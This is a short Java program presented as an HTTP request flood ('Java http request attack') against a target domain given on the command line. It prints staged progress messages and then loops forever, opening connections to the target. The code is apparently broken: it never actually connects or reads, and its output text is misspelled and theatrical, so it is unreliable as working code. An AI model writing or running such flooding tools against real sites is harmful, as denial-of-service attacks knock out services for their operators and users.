import java.net.HttpURLConnection;
import java.net.URL;

public class Main {
    private static HttpURLConnection connection;
    public static void main(String[] args) throws InterruptedException {
        try {
            if (args[0].equals("--requests")) {
                String http = args[1];
            } else {
                System.exit(0);
            }
        } catch (Exception argumentException) {
            System.exit(0);
        }
        System.out.println("[+] [requester] Testing http connection to target domain: " + args[1]);
        Thread.sleep(4000);
        try {
            URL url = new URL(args[1]);
        } catch(Exception requestError) {
            System.out.println("[!] [error] Connection to http target domain: " + args[1] + " failed!");
            System.exit(0);
        }
        int value = 0;
        System.out.println("[+] [porcker] Procking to http domain server: " + args[1]);
        for(int i = 0; i <= 7; i++) {
            System.out.println("[+] [procker] Prock: " + i + " starting on http domain: " + args[1]);
            Thread.sleep(1000);
        }
        Thread.sleep(2000);
        System.out.println("[+] [requester] Java http request attack starting in 5 seconds");
        Thread.sleep(5000);
        while(true) {
            try {
                URL url = new URL(args[1]);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                System.out.println("[+] Java http request to target domain: " + args[1] + " succes! Request number: " + value);
                value++;
            } catch (Exception requestError) {
                System.out.println("[!] Java http request to target domain: " + args[1] + " failed! Request number: " + value);
                value++;
            }
        }
    }
}


